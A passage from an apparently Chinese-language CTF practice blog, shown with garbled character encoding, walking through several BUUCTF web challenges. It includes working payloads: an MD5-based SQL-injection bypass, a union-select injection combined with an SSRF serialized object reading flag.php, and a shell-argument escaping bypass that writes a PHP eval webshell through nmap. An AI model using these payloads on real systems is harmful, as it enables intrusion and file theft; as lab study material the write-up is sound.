src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723181917454.png" alt="image-20210723181917454"></p><p><strong>ä¸‰ã€å¼±å¯†ç </strong></p><p>ç”¨æˆ·adminå¯†ç ä¸º123</p><p>çˆ†ç ´æˆ–è€…è¯•ä¸€è¯•å°±èƒ½è¯•å‡ºæ¥å¯†ç </p><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>è¿›å…¥ååªæœ‰ä¸€ä¸ªæäº¤æ¡†ï¼Œæ²¡å•¥æ€è·¯ï¼Œå…ˆç”¨bpæŠ“ä¸ªåŒ…</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723205715453.png" alt="image-20210723205715453"></p><p>çœ‹è§æœ‰ä¸ªhint</p><p>select * from &#39;admin&#39; where password=md5($pass,true)</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723205633361.png" alt="image-20210723205633361"></p><p>ç„¶åçŒœè¿™é‡Œåº”è¯¥è¦åˆ©ç”¨sqlæ³¨å…¥çš„ï¼Œä½†æˆ‘ä¸ä¼šäº†x</p><p>çœ‹äº†ä¸€ä¸‹è¯´æ˜¯è¦ç”¨ffifdyopæ¥ç»•è¿‡ï¼Œå› ä¸ºè¿™ä¸ªå­—ç¬¦ä¸²ç»è¿‡md5ä¹‹åä¼šå˜æˆ 276f722736c95d99e921722cf9ed621cï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å‰å‡ ä½åˆšå¥½æ˜¯&#39; or &#39;6</p><p>å°±ä¼šæ„æˆä¸‡èƒ½å¯†ç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723210730068.png" alt="image-20210723210730068"></p><p>æˆåŠŸè¿›å…¥ä¸‹ä¸€æ­¥ï¼Œå…ˆæŸ¥çœ‹æºç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723210837745.png" alt="image-20210723210837745"></p><p>åˆ©ç”¨md5ä¸èƒ½å¤„ç†æ•°ç»„ä¼šè¿”å›nullçš„ç‰¹æ€§å°±èƒ½ç»•è¿‡ï¼Œæ¥ä¸‹æ¥è¿›è¡Œä»£ç å®¡è®¡</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723210915141.png" alt="image-20210723210915141"></p><p>åŒæ ·å¯ä»¥åˆ©ç”¨md5ä¸èƒ½å¤„ç†æ•°ç»„çš„ç‰¹æ€§</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723211130123.png" alt="image-20210723211130123"></p><h2 id="ç½‘é¼æ¯-2018-Fakebook"><a href="#ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook"></a>[ç½‘é¼æ¯ 2018]Fakebook</h2><p>å…ˆjoinä¸€ä¸‹ï¼Œç„¶åæºç é‡Œæœ‰</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724215234506.png" alt="image-20210724215234506"></p><p>è¿™é‡Œè¿‡æ»¤äº†union select ä¸­é—´å¯ä»¥åŠ ä¸ªæ³¨é‡Šç¬¦æ¥å½“ç©ºæ ¼æ¥ç»•è¿‡å»</p><p>è¿™ä¸ªé¡µé¢å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œ</p><p>æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ç§æ˜¯ç›´æ¥sqlè¯»æ–‡ä»¶ï¼Œå¦ä¸€ç§æ˜¯ssrf</p><p><strong>ä¸€.</strong></p><p>å€ŸåŠ©è”åˆæŸ¥è¯¢å¯ä»¥çœ‹åˆ°user()æ˜¯rootï¼Œæ‰€ä»¥ç›´æ¥çŒœæ–‡ä»¶ä½ç½®</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220427222358992.png" alt="image-20220427222358992"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220427222419307.png" alt="image-20220427222419307"></p><p><strong>äºŒ.</strong></p><p>sqlæ³¨å…¥æŸ¥åˆ°åº•ï¼Œæœ€ç»ˆå¯ä»¥æŸ¥åˆ°è¿™äº›</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724221156289.png" alt="image-20210724221156289"></p><p>è¿™é‡Œèƒ½çœ‹å‡ºæ¥dataæ˜¯ä¸ªåºåˆ—åŒ–åçš„ç»“æœï¼Œä½†æ˜¯ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨</p><p>çœ‹ä¸€çœ¼è¿™ä¸ª</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220427223617802.png" alt="image-20220427223617802"></p><p>è§£ç ä¹‹åå‘ç°æ˜¯ç™¾åº¦é¦–é¡µçš„æºç </p><p>ç„¶åæ‰«ä¸€ä¸‹å‘ç°</p><p>æœ‰robots.txtå¤‡ä»½æ–‡ä»¶</p><pre class="language-none"><code class="language-none">&lt;?phpclass UserInfo&#123;    public $name &#x3D; &quot;&quot;;    public $age &#x3D; 0;    public $blog &#x3D; &quot;&quot;;    public function __construct($name, $age, $blog)    &#123;        $this-&gt;name &#x3D; $name;        $this-&gt;age &#x3D; (int)$age;        $this-&gt;blog &#x3D; $blog;    &#125;    function get($url)    &#123;        $ch &#x3D; curl_init();        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        $output &#x3D; curl_exec($ch);        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);        if($httpCode &#x3D;&#x3D; 404) &#123;            return 404;        &#125;        curl_close($ch);        return $output;    &#125;    public function getBlogContents ()    &#123;        return $this-&gt;get($this-&gt;blog);    &#125;    public function isValidBlog ()    &#123;        $blog &#x3D; $this-&gt;blog;        return preg_match(&quot;&#x2F;^(((http(s?))\:\&#x2F;\&#x2F;)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\&#x2F;\S*)?$&#x2F;i&quot;, $blog);    &#125;&#125;</code></pre><p>å¥½ï¼Œçœ‹ä¸æ‡‚äº†ï¼ˆ</p><p>æŠ„ä¸€ä¸‹åˆ«äººçš„åˆ†æ</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php  class UserInfo&#123;    public $name &#x3D; &quot;&quot;;    public $age &#x3D; 0;    public $blog &#x3D; &quot;&quot;;     public function __construct($name, $age, $blog)    &#123;        $this-&gt;name &#x3D; $name;        $this-&gt;age &#x3D; (int)$age;        $this-&gt;blog &#x3D; $blog;    &#125;     function get($url)    &#123;        $ch &#x3D; curl_init();        &#x2F;*curl_init()ï¼šåˆå§‹åŒ–ä¸€ä¸ª cURL ä¼šè¯å¹¶ä¸”å…¨éƒ¨çš„é€‰é¡¹éƒ½è¢«è®¾ç½®åè¢«è°ƒç”¨*&#x2F;         curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        &#x2F;*            curl_setopt â€” ä¸ºç»™å®šçš„cURLä¼šè¯å¥æŸ„è®¾ç½®ä¸€ä¸ªé€‰é¡¹ã€‚                è¯´æ˜ï¼š                    bool curl_setopt ( resource $ch , int $option , mixed $value )                å‚æ•°:                    chï¼šç”± curl_init() è¿”å›çš„ cURL å¥æŸ„ã€‚                    optionï¼šéœ€è¦è®¾ç½®çš„CURLOPT_XXXé€‰é¡¹ã€‚                    valueï¼šå°†è®¾ç½®åœ¨optioné€‰é¡¹ä¸Šçš„å€¼ã€‚                    å¯¹äºä¸‹é¢çš„è¿™äº›optionçš„å¯é€‰å‚æ•°ï¼Œvalueåº”è¯¥è¢«è®¾ç½®ä¸€ä¸ªboolç±»å‹çš„å€¼ï¼š                        CURLOPT_RETURNTRANSFERï¼šå°†curl_exec()è·å–çš„ä¿¡æ¯ä»¥æ–‡ä»¶æµçš„å½¢å¼è¿”å›ï¼Œè€Œä¸æ˜¯ç›´æ¥è¾“å‡ºã€‚                    å¯¹äºä¸‹é¢çš„è¿™äº›optionçš„å¯é€‰å‚æ•°ï¼Œvalueåº”è¯¥è¢«è®¾ç½®ä¸€ä¸ªstringç±»å‹çš„å€¼ï¼š                        CURLOPT_URLï¼šéœ€è¦è·å–çš„URLåœ°å€ï¼Œä¹Ÿå¯ä»¥åœ¨curl_init()å‡½æ•°ä¸­è®¾ç½®ã€‚                                                                          ###################                        æ–‡ä»¶æµçš„å½¢å¼:æŒ‡çš„æ˜¯åœ¨ä¼ é€’è¿‡ç¨‹ä¸­çš„æ–‡ä»¶,æ¯”å¦‚ä½ ä¸Šä¼ ä¸€å¼ å›¾ç‰‡,é‚£ä¹ˆä»–ä¸æ˜¯ä»¥ä¸€ä¸ªå®Œæ•´çš„å›¾ç‰‡ä¼ è¾“çš„,æ˜¯å°†æ–‡ä»¶æŒ‰ç‰¹å®šç¼–ç çš„å­—ç¬¦ä¼ è¾“.è¿™ä¸ªå°±æ˜¯æ–‡ä»¶æµ        *&#x2F;        $output &#x3D; curl_exec($ch);        &#x2F;*curl_exec ï¼šæ‰§è¡Œ cURL ä¼šè¯*&#x2F;        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);        &#x2F;*            curl_getinfo â€” è·å–ä¸€ä¸ªcURLè¿æ¥èµ„æºå¥æŸ„çš„ä¿¡æ¯                è¯´æ˜ï¼š                       mixed curl_getinfo ( resource $ch [, int $opt &#x3D; 0 ] )è·å–æœ€åä¸€æ¬¡ä¼ è¾“çš„ç›¸å…³ä¿¡æ¯ã€‚                å‚æ•°ï¼š                      ch ç”± curl_init() è¿”å›çš„ cURL å¥æŸ„ã€‚                      optï¼šè¿™ä¸ªå‚æ•°å¯èƒ½æ˜¯ä»¥ä¸‹å¸¸é‡ä¹‹ä¸€:                            CURLINFO_HTTP_CODE : æœ€åä¸€ä¸ªæ”¶åˆ°çš„HTTPä»£ç         *&#x2F;                 if($httpCode &#x3D;&#x3D; 404) &#123;            return 404;        &#125;        curl_close($ch);         return $output;    &#125;     public function getBlogContents ()    &#123;        return $this-&gt;get($this-&gt;blog);    &#125;     public function isValidBlog ()    &#123;        $blog &#x3D; $this-&gt;blog;        return preg_match(&quot;&#x2F;^(((http(s?))\:\&#x2F;\&#x2F;)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\&#x2F;\S*)?$&#x2F;i&quot;, $blog);    &#125;        cURLæ˜¯ä¸€ä¸ªåˆ©ç”¨URLè¯­æ³•åœ¨å‘½ä»¤è¡Œä¸‹å·¥ä½œçš„æ–‡ä»¶ä¼ è¾“å·¥å…·ï¼Œ1997å¹´é¦–æ¬¡å‘è¡Œã€‚å®ƒæ”¯æŒæ–‡ä»¶ä¸Šä¼ å’Œä¸‹è½½ï¼Œæ‰€ä»¥æ˜¯ç»¼åˆä¼ è¾“å·¥å…·ï¼Œä½†æŒ‰ä¼ ç»Ÿï¼Œä¹ æƒ¯ç§°cURLä¸ºä¸‹è½½å·¥å…·ã€‚    cURLè¿˜åŒ…å«äº†ç”¨äºç¨‹åºå¼€å‘çš„libcurlã€‚PHPæ”¯æŒçš„ç”±Daniel Stenbergåˆ›å»ºçš„libcurlåº“å…è®¸ä½ ä¸å„ç§çš„æœåŠ¡å™¨ä½¿ç”¨å„ç§ç±»å‹çš„åè®®è¿›è¡Œè¿æ¥å’Œé€šè®¯ã€‚libcurlç›®å‰æ”¯æŒhttpã€httpsã€ftpã€gopherã€telnetã€dictã€fileå’Œldapåè®®ã€‚libcurlåŒæ—¶ä¹Ÿæ”¯æŒHTTPSè®¤è¯ã€HTTP POSTã€HTTP PUTã€ FTP ä¸Šä¼ (è¿™ä¸ªä¹Ÿèƒ½é€šè¿‡PHPçš„FTPæ‰©å±•å®Œæˆ)ã€HTTP åŸºäºè¡¨å•çš„ä¸Šä¼ ã€ä»£ç†ã€cookieså’Œç”¨æˆ·å+å¯†ç çš„è®¤è¯ã€‚PHPä¸­ä½¿ç”¨cURLå®ç°Getå’ŒPostè¯·æ±‚çš„æ–¹æ³•è¿™äº›å‡½æ•°åœ¨PHP 4.0.2ä¸­è¢«å¼•å…¥ã€‚ </code></pre><p>æ–°çŸ¥è¯†ï¼šè¿™é‡Œåˆ©ç”¨äº†ssrfæ¼æ´</p><p><a href="https://www.freebuf.com/company-information/220086.html">SSRFæ¼æ´æ”»å‡»åŸç†åŠé˜²å¾¡æ–¹æ¡ˆ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p><a href="https://blog.csdn.net/fageweiketang/article/details/88983921"> SSRF æ¼æ´è®°å½•_å‘å“¥å¾®è¯¾å ‚-CSDNåšå®¢</a></p><p><a href="https://www.t00ls.net/articles-41070.html">SSRFæ¼æ´(åŸç†&amp;ç»•è¿‡å§¿åŠ¿) - T00ls.Net</a></p><p>SSRFï¼ˆServer-Side Request Forgeryï¼‰ä¹Ÿå±äºåº”ç”¨å±‚ä¸Šçš„ä¸€ä¸ªæ¼æ´ç±»å‹ï¼Œç”¨ä¸€ä¸ªæœ€ç®€å•çš„ä¾‹å­æ¥ç†è§£è¿™ä¸ªæ¼æ´ï¼šæ¯”å¦‚ä¸€ä¸ªæ·»åŠ å›¾æ–‡çš„åŠŸèƒ½ï¼Œå¡«å…¥æ ‡é¢˜å†…å®¹å’Œå°é¢å›¾ç„¶åæäº¤åœ¨ç½‘ç«™å‰å°æ˜¾ç¤ºï¼Œå¯¹äºè¿™ä¸ªåŠŸèƒ½çš„å›¾ç‰‡å®ƒé™¤äº†å¯ä»¥è®©ä½ ä¸Šä¼ ä»¥å¤–ï¼Œè¿˜æ”¯æŒå¡«å…¥è¿œç¨‹å›¾ç‰‡åœ°å€ï¼Œå¦‚æœä½ å¡«å…¥äº†è¿œç¨‹çš„å›¾ç‰‡åœ°å€ï¼Œåˆ™è¯¥ç½‘ç«™ä¼šåŠ è½½è¿œç¨‹å›¾è¿‡æ¥è¿›è¡Œæ˜¾ç¤ºï¼Œè€Œå¦‚æœç¨‹åºå†™æ³•ä¸ä¸¥è°¨æˆ–è€…è¿‡æ»¤ä¸ä¸¥æ ¼ï¼Œåˆ™åŠ è½½å›¾ç‰‡åœ°å€çš„è¿™ä¸ªåŠŸèƒ½å¯èƒ½å°±å¯ä»¥åŒ…å«è¿›è¡Œä¸€äº›æ¶æ„çš„è„šæœ¬æ–‡ä»¶ï¼Œæˆ–è€…ä½ è¾“å…¥å†…ç½‘çš„ ip æˆ–è€…ä¸€äº›ç³»ç»Ÿçš„æ–‡ä»¶éƒ½ä¼šè¢«è§£ææ‰§è¡Œï¼Œè¿™ä¸ªæˆ‘ä»¬ä¸€èˆ¬å«å®ƒ SSRF å³æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ã€‚</p><p>curl ä½¿ç”¨çš„ç»å…¸è¿‡ç¨‹ï¼Œåˆå§‹åŒ–ï¼Œç„¶åè®¾ç½®è®¿é—®çš„åœ°å€ï¼Œéšåæ‰§è¡Œï¼Œæœ€åå…³é—­ã€‚</p><p>å°†URLæ¢æˆfile://çš„å½¢å¼ï¼Œå°±å¯ä»¥è¯»å–æœ¬åœ°æ–‡ä»¶ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬è¦è®¿é—®çš„æ˜¯flag.phpï¼Œæ‰€ä»¥æŒ‰ç…§ä¹‹å‰sqlæ³¨å…¥å¾—å‡ºæ¥çš„åºåˆ—åŒ–å†…å®¹è¿›è¡Œä¿®æ”¹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724225352853.png" alt="image-20210724225352853"></p><p>æœ€ç»ˆpayloadä¸º</p><pre class="language-none"><code class="language-none">?no&#x3D;-1%20union&#x2F;**&#x2F;select 1,(select%20group_concat(no,username,passwd,data)%20from%20users),3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:27:&quot;file:&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</code></pre><p>çœ‹ä¸€ä¸‹æºç ï¼Œæ‰¾åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724225327036.png" alt="image-20210724225327036"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724225342961.png" alt="image-20210724225342961"></p><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>è¿™ä¸ªå’Œä¹‹å‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¢˜å·®ä¸å¤šï¼Œä¸Šä¼ æ—¶è¿‡æ»¤äº†phåç¼€åï¼Œæ‰€ä»¥è¦ä¸Šä¼ ä¸ªå›¾ç‰‡é©¬ï¼ŒåŒæ—¶è¿˜è¦ä¸Šä¼ ä¸ª.htaccessæ–‡ä»¶è§£æå›¾ç‰‡é©¬ï¼Œç”¨bpæŠ“åŒ…æŠŠç±»å‹æ”¹æˆimage/jpegå°±è¡Œ</p><p>ç„¶åèœåˆ€è¿ä¸€ä¸‹åœ¨æ ¹ç›®å½•é‡Œå°±èƒ½æ‰¾åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210803230538636.png" alt="image-20210803230538636"></p><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>å…ˆç›´æ¥è´´å‚è€ƒçš„æ–‡ç« äº†</p><p><a href="https://blog.csdn.net/tm_1024/article/details/107393796?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0.control&spm=1001.2101.3001.4242">BUUCTF 2018]Online Tool_é¢˜è§£_é£è¿‡æ±Ÿå—ä¹±çš„åšå®¢-CSDNåšå®¢</a></p><p>[<a href="https://blog.csdn.net/weixin_44077544/article/details/102835099?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">BUUCTF 2018]Online Tool_æ²ç›®çš„åšå®¢-CSDNåšå®¢</a></p><p><a href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/#2-CVE-2016-10045">è°ˆè°ˆescapeshellargå‚æ•°ç»•è¿‡å’Œæ³¨å…¥çš„é—®é¢˜ (lmxspace.com)</a></p><p><a href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() ä¹‹æ®‡ (seebug.org)</a></p><p> <a href="https://blog.csdn.net/zhangxiansheng12/article/details/107216167/">BUUCTF 2018]Online Tool - nmap\escapeshellargä¸escapeshellcmdè¿ç”¨_M4xlmumçš„åšå®¢-CSDNåšå®¢</a></p><p>å…ˆæ˜¯ä»£ç å®¡è®¡ï¼Œåˆæ˜¯æ²¡è§è¿‡çš„ä¸œè¥¿</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210804001517374.png" alt="image-20210804001517374"></p><p>ç¬¬ä¸€ä¸ªifè¯­å¥å¥½åƒæ²¡å•¥ç”¨</p><p>åœ¨PHP ä¸­ä½¿ç”¨ $_SERVER[&quot;REMOTE_ADDR&quot;] æ¥å–å¾—å®¢æˆ·ç«¯çš„ IPåœ°å€ï¼Œä½†å¦‚æœå®¢æˆ·ç«¯æ˜¯ä½¿ç”¨ä»£ç†æœåŠ¡å™¨æ¥è®¿é—®ï¼Œé‚£å–åˆ°çš„å°±</p><p>æ˜¯ä»£ç†æœåŠ¡å™¨çš„ IP åœ°å€ï¼Œè€Œä¸æ˜¯çœŸæ­£çš„å®¢æˆ·ç«¯ IP åœ°å€ã€‚è¦æƒ³é€è¿‡ä»£ç†æœåŠ¡å™¨å–å¾—å®¢æˆ·ç«¯çš„çœŸå® IP åœ°å€ï¼Œå°±è¦ä½¿ç”¨</p><p>$_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;] æ¥è¯»å–ã€‚</p><p>ä¸è¿‡è¦æ³¨æ„çš„äº‹ï¼Œå¹¶ä¸æ˜¯æ¯ä¸ªä»£ç†æœåŠ¡å™¨éƒ½èƒ½ç”¨ $_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;] æ¥è¯»å–å®¢æˆ·ç«¯çš„çœŸå®IPï¼Œæœ‰äº›ç”¨æ­¤</p><p>æ–¹æ³•è¯»å–åˆ°çš„ä»ç„¶æ˜¯ä»£ç†æœåŠ¡å™¨çš„ IPã€‚</p><p>ç¬¬äºŒä¸ªifè¯­å¥æ˜¯è¦æ±‚ä¼ å…¥ä¸€ä¸ªå‚æ•°ç„¶ååˆ©ç”¨escapeshellargå’Œescapeshellcmdä¸¤ä¸ªå‡½æ•°çš„æ¼æ´å®ç°systemå‘½ä»¤æ‰§è¡Œ</p><pre class="language-txt" data-language="txt"><code class="language-txt">escapeshellargï¼Œä¼šåœ¨å­—ç¬¦ä¸²ä¸­æ‰€æœ‰çš„å•å¼•å·ï¼ˆåŒ…æ‹¬æˆå¯¹å­˜åœ¨é—­åˆçš„ï¼‰å‰æ·»åŠ ä¸€ä¸ª&#39;\&#39; ï¼Œè‹¥å·²ç»ç”¨\è½¬ä¹‰ï¼Œåˆ™ä¼šç”¨&#39;\&#39;&#96;æ›¿æ¢\ï¼Œæœ€åå°†æ•´ä¸ªå˜é‡ç”¨å•å¼•å·åŒ…è£¹ã€‚escapeshellcmd() å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ° exec() æˆ– system() å‡½æ•°ï¼Œæˆ–è€… æ‰§è¡Œæ“ä½œç¬¦ ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚åæ–œçº¿ï¼ˆ\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š &amp;#;&#96;|\?~&lt;&gt;^()[]&#123;&#125;$*, \x0A å’Œ \xFFã€‚â€™ å’Œ â€œ ä»…åœ¨ä¸é…å¯¹çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚ åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ % å’Œ ! å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚</code></pre><p>è¿™ä¸ªæ¼æ´ç±»ä¼¼è¿™ç§</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210804005109985.png" alt="image-20210804005109985"></p><p>mkdirå‘½ä»¤æ˜¯Linuxä¸­çš„æ–°å»ºæ–‡ä»¶å¤¹</p><p>chdiræ”¹å˜ç›®å½•</p><p>æœ€åå°±æ˜¯systemçš„å‘½ä»¤æ‰§è¡Œäº†ï¼Œè¿™é‡Œé¢æ˜¯nmapçš„ä¸€äº›å‘½ä»¤</p><p>-T5 :æ‰«æç­‰çº§,è¶Šå¤§è¶Šå¿«,è¶Šå¿«è¶Šä¸å®‰å…¨,æœ€å¥½è®¾ç½®ä¸º-T4</p><p>-sT :TCP connent æ‰«æ,ä¸å¤ªå®‰å…¨(ç•™ä¸‹è®°å½•ä¿¡æ¯),è€Œä¸”é€Ÿåº¦è¾ƒæ…¢,ä¸€èˆ¬å…ˆä½¿ç”¨-sSæµ‹è¯•</p><p>-Pn :ç¦ç”¨ping</p><p>-host-timeout 2:è®¾ç½®æ‰«æä¸€å°ä¸»æœºçš„æ—¶é—´ï¼Œä»¥æ¯«ç§’ä¸ºå•ä½ã€‚</p><p>-F :å¿«é€Ÿæ‰«ææ¨¡å¼ï¼Œåªæ‰«æåœ¨nmap-servicesæ–‡ä»¶ä¸­åˆ—å‡ºçš„ç«¯å£ã€‚</p><p>-oG test.txt: å°†æ‰«æç»“æœç”Ÿæˆ test.txt æ–‡ä»¶</p><p>æ¥ä¸‹æ¥å°±æ˜¯æƒ³åŠæ³•åˆ©æ¼æ´ç»™é‡Œé¢ä¼ å…¥ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬</p><p>payload</p><pre class="language-txt" data-language="txt"><code class="language-txt">&#39;&lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php &#39;</code></pre><p>ç„¶åç»è¿‡escapeshellargå’Œescapeshellcmdä¸¤ä¸ªå‡½æ•°å°±ä¼šå˜æˆç±»ä¼¼è¿™ç§</p><pre class="language-txt" data-language="txt"><code class="language-txt">&#39; &#39;\\&#39;&#39;\&lt;\?php eval\(\)\;\?\&gt; -oG 1.php &#39;\\&#39;&#39; &#39;</code></pre><p>è¿™é‡Œå•å¼•å·éƒ½é—­åˆäº†ä¸ä¼šå½±å“åˆ°ä¼ å…¥çš„ä¸€å¥è¯æœ¨é©¬</p><p>ä¹‹åå°±å¯ä»¥ç”¨èœåˆ€è¿æ¥æ‰¾flagäº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210804004604659.png" alt="image-20210804004604659"></p><p> e9612257fa1c5134d014e95a7440d357</p><p>è¿™æ˜¯ä¸Šä¼ åçš„åœ°å€</p><p>èœåˆ€è¿ä¸€ä¸‹<a href="http://d26a51d3-a34a-46e5-9be3-80b3a129befb.node4.buuoj.cn/">http://d26a51d3-a34a-46e5-9be3-80b3a129befb.node4.buuoj.cn/</a> e9612257fa1c5134d014e95a7440d357/1.php</p><p>æ ¹ç›®å½•æ‰¾åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210804004814988.png" alt="image-20210804004814988"></p><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>é¦–å…ˆæ˜¯ä¸ªç™»å½•æ¡†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808124202495.png" alt="image-20210808124202495"></p><p>çœ‹ä¸€ä¸‹helpçš„å†…å®¹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808124233134.png" alt="image-20210808124233134"></p><p>è¯•è¯•æŠ“åŒ…ç„¶åæ”¹ä¸€ä¸‹è¯·æ±‚æ–¹å¼åä¼šä¸‹è½½ä¸€ä¸ªwordæ–‡æ¡£ï¼Œæ²¡å•¥ç”¨</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808124659707.png" alt="image-20210808124659707"></p><p>è¿™é‡Œæ˜¯WEB-INF/web.xmlæ³„éœ²</p><pre class="language-none"><code class="language-none">WEB-INFä¸»è¦åŒ…å«ä¸€ä¸‹æ–‡ä»¶æˆ–ç›®å½•:&#x2F;WEB-INF&#x2F;web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚&#x2F;WEB-INF&#x2F;classes&#x2F;ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ 